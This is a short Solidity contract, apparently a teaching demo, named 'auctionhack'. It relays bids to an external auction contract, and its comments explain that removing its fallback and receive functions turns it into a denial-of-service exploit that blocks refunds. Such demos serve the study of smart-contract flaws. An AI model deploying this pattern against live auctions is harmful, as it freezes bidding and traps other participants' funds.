// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface auction {
    function bid() external payable;
}

contract auctionhack {
    auction public auctioncontract;

    // Gets the address of the auction contract 
    constructor(address _address) {
        auctioncontract = auction(_address);
    }

    // bid() calls the bid() from auction contract
    function bid() public payable {
        auctioncontract.bid{value: msg.value}();
    }

    // Possible way to receive tokens in this smart contract 
    // A fallback() can also be used in case by calling a function which isn't available
    // fallback() prevents the Denial of Service (DoS) Attacks 
    fallback() external payable {
        // Remove this function for the exploit to work
    }

    // Another possible way to receive tokens in this smart contract
    // receive() prevents the Denial of Service (DoS) Attacks 
    receive() external payable {
        // Remove this function for the exploit to work
    }
}